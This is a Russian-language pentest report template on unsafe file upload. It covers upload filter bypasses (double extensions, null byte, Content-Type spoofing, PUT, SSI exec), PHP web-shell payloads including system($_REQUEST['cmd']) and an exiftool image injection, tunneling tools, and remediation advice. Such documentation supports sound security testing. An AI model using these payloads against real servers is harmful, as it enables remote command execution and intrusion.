# **Unsafe File Upload.Небезопасная загрузка файлов.**

## **Описание уязвимости**
Уязвимость небезопасной загрузки файлов веб-преложений позволяет злоумышленнику загружать и выполнять вредоносный код на веб-сервере. Обычно это возможно  при отсутствие проверок и фильтрации загружаемой информации, тем самым злоумышленник может внедрить в файл небезопасный код.

В результате небезопасной загрузки файлов золумышленник может:
+ Загрузить web-shell, получив удалённое выполнение команд на веб-сервере
+ Загрузить reverse-shell, получив удалённое обратное подключение на свою машину
+ Возможность перезаписи и удаления файлов
+ XSS
+ Размещение фишинговой страницы на веб-сервере
+ Расскрытие конфиденциальной информации
+ Отказ в обслуживание
+ `Если вашего случая тут нет, дополните своим кейсом этот шаблон`

Подробнее с Unsafe File Upload можно ознакомиться здесь:
```
https://book.hacktricks.xyz/pentesting-web/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
```

## **Теория**
Узвимость небезопасной загрузки файлов возникает при наличие функционала загрузки файлов на сервере и отсутствие проверок загружаемого контента.
При наличии данного функционала загрузки файлов на веб-сервер, злоумышленник может добавить вредоносный код в файл и отправить его на веб-сервер, получив в ответ ссылку на файл, в зависимости от того, как сервер его обработает.

Пример загрузки файлов на сервер:
Используя встроенный функционал сайта, выберим файл, содержаший php web-shell и загрузим его на сервер.
В ответ от сервера, получаем строку с расположением файла.
![изображение](https://user-images.githubusercontent.com/42802213/197973175-0a86f5c9-216c-4d74-9da3-333172a96f0f.png)

Перейдя по пути полученному в ответ от веб сервера, наблюдаем интерфейс web-shell'a и функционал для выполнения комманд.

![изображение](https://user-images.githubusercontent.com/42802213/197973544-e166c883-401b-4f5c-b3ee-cd4f52bf8ad1.png)


Рассмотрим возможные сценарии и способы обхода фильтрации при загрузке небезопасных файлов:

### **Обход фильтрации загружаемого контента**
+ Загрузка файлов с именем, которое уже имеется на сервере.(можно получить сообщение об ошибке(может привести к перезаписи чувствительных файлов));
+ Загрузка фалов, когда папка с таким названием уже существует;
+ Загрузка файлов с длинным названием;
+ Загрузка одно файла несколько раз, в один промежуток времени;
+ Использование двойных расширений или малоизвестных расширений

Обходится с помощью использования двойных расширений (`shell.php.png`) или малоизвестный расширений (`.php5`, `.phtml`, `.shtml`, `.htaccess`). Кроме того, возможна инъекция нулевого байта (`shell.php%00.jpg`) или регистрозависимость при проверке (`.PHp3', '.aSp`).
+ Санитайзеры

Оставляет большую степень свободы. Например, если санитайзер удаляет вхождения подстрок типа `.php`, то использования имени файла вида `shell.p.phphp` позволяет после загрузки получить файл с именем `shell.php`. 
+ Валидация Content-Type

```
POST / HTTP/1.1
Host: vuln.ru
Content-Length: 200
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="info.php"
Content-Type: text/php
 <?php phpinfo(); ?>
------WebKitFormBoundary--
```
строчка `Content-Type: text/php` может быть заменена на строчку `Content-Type: image/png`. 
+ `Server Side Includes`

Язык для динамической «сборки» веб-страниц на сервере из отдельных составных частей и выдачи клиенту полученного HTML-документа. Имеет расширения `.shtml`, `.stm` или `.shtm`. Например, при загрузке и вызове `file.shtml`, содержащего код 
```<!-- #exec cmd="ls" -->```
атакующему будет выведен список файлов данной директории. 
+ Загрузка файлов используя метод `PUT`

Если метод `PUT` настроен не корректно, можно использовать его для загрузки файлов на сервер:
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
+ Добавление в начало файла байты реального изображения

```
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```
или добавить полезную нагрузку в изображение:
```
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

Рассмотрим пример уязвимого кода на php, в котором не производится проверка роли пользователя от которого загружается файл:
```
      <?php
        $target_dir = "uploads/";
        $target_file = $target_dir.basename($_FILES["fileToUpload"]["name"]);
        $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
```
Для исправления данной уязвимости следует добавить код, проверяющий роль пользователя перед загрузкой файла:
```
        if (!current_user_can('upload_files'))  //проверка прав пользователя на загрузку файлов
        die(__('You do not have permission to upload files.')); 
```

### **Способы проброса подключения на удалённую машину**
| Утилита  |     Способ         | Ссылка|
| ---------|:------------------:| -----:|
| ssh      | Более подробно по ссылке   | [SSH](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssh) |
| sshutlle | `sshuttle -vr username@ip 0/0 --ssh-cmd 'ssh'` |   [sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) |
| reGeorg  | Можно загрузить файл на веб-сервер с тунелем и установить соединение через него(если нет возможности открыть порт на машине)|    [reGeorg](https://github.com/sensepost/reGeorg) |
| chisel   | Установка соединения через сервер и клиент. Ссылки на инструкцию и релиз на github(чтоб не устанавливать на машину) | [Интсрукция](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel) [Release](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel)       |


[Дополнительная информация по тунелям и пробросу портов](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)

[Reverse Shell Generator](https://www.revshells.com/)
### **Демонстрация уязвимости**
```Для демонстрации уязвимости нужно:
1)Указать ссылку/функционал для загрузки файлов
2)Способ загрузки файла
3)Желательно указать содержимое загружаемого файла
4)Результат загрузки файла
```
`Пример 1`
В ходе исследования веб-приложения был обнаружен функционал для загрузки файлов на сервер `ссылка`

`Рис 1` - функционал загрузки файлов

Для проверки уязвимости был загружен файл содержащий следующий код:
```
<?php 
$output = shell_exec('pwd;id;ifconfig');
echo "<pre>$output</pre>";
?>
```
После загрузки файла злоумышленнику нужно обратиться к файлу по прямой ссылке. Код, который содержится в файле с расширением .php, будет исполнен на стороне сервера. Ниже на скриншоте показан ответ сервера с выполненными на веб-сервере командами.

`Рис 2` - результат выполнения содержимого файла

### **Рекомендации**
+ Проверка расширений загружаемых файлов
+ Проверка содержимого загружаемых файлов
+ Создания списка допустимых расширений, допустимых  к загрузке
+ Генерировать имя файла и расширение при записи на сервер
+ Запрет на выполнение файлов в дерикториях доступных пользователю
+ Сравнивать последовательность байтов файла(magic bytes) с ожидаемым расширением файла, например файлы `JPEG` всегда содержат в начале `FF D8 FF`
+  `Если вашего случая тут нет, дополните своим кейсом этот шаблон`

### **Проверка расширений загружаемых файлов и проверка содержимого загружаемых файлов**
Необходимо проверять не только расширение загружаемых файлов, mime-type и стартовые последовательности байт, но и содержимое файла на наличие вредоносного кода. Такие возможности предоставляют WAF решения.
### **Создания списка допустимых расширений, допустимых  к загрузке**
Создание "BlackList" и "WhiteList" расширений для загрузки файлов
BlackList - список расширений недоступных для загрузки
WhiteList - список расширений, файлы с которыми допущены для загрузки
### **Генерировать имя файла и расширение при записи на сервер**
Лучше всего генерировать случайное имя, которое невозможно угадать, например использовать UUID в качестве имени файла.
Для этого можно использовать встроенную функцию в PHP.

`$filename = uniqid();`
### **Запрет на выполнение файлов в дерикториях доступных пользователю**
Загружать файлы на веб сервер за пределы веб-каталога, это гарантирует, что веб файлы не будут доступны напрямую, через веб-сервер, если такая возможность отсутствует, следует выставить права на загружаемые файлы `только для чтения`.
### **Сравнивать последовательность байтов файла с ожидаемым расширением файла**
Производить сравнение получаемого расширения файла с его стандартными байтами, которы епринадлежать данному расширению.
```https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance/```
### **Общая рекомендация**
Убедитесь, что пользователь не имеет контроля над именем файла и расширением. Лучше всего генерировать случайное имя, которое невозможно угадать, например, используя UUID в качестве имени файла. Это предотвращает перезапись существующих файлов, загрузку веб-оболочек, прямые ссылки на файлы и уязвимости обхода пути.
Рекомендуется хранить загруженные файлы за пределами корневого веб-каталога, в идеале на отдельном разделе или в общей папке. Это гарантирует, что загруженные файлы не могут быть напрямую доступны через веб-сервер, это предотвращает загрузку исполняемых скриптов (т.е. веб-шеллов), и злоумышленники не могут вызвать состояние отказа в обслуживании веб-сервера, заполнив его системный диск. Кроме того, загруженные файлы не должны иметь разрешения на выполнение (т.е. устанавливаться на уровне файловой системы или включать директивы веб-сервера).
Ограничения ресурсов должны быть настроены для всего раздела хранилища, а также максимальный размер файла и общий размер загрузки одним пользователем.
Если существуют ограничения по типам файлов, проверьте файловую сигнатуру, а не полагайтесь на расширение или MIME-тип. Все проверки должны выполняться на стороне сервера, так как меры на стороне клиента можно легко обойти. В зависимости от формата файла должны выполняться дополнительные проверки достоверности (например, формата файла).
### **Дополнительная литература**
todo
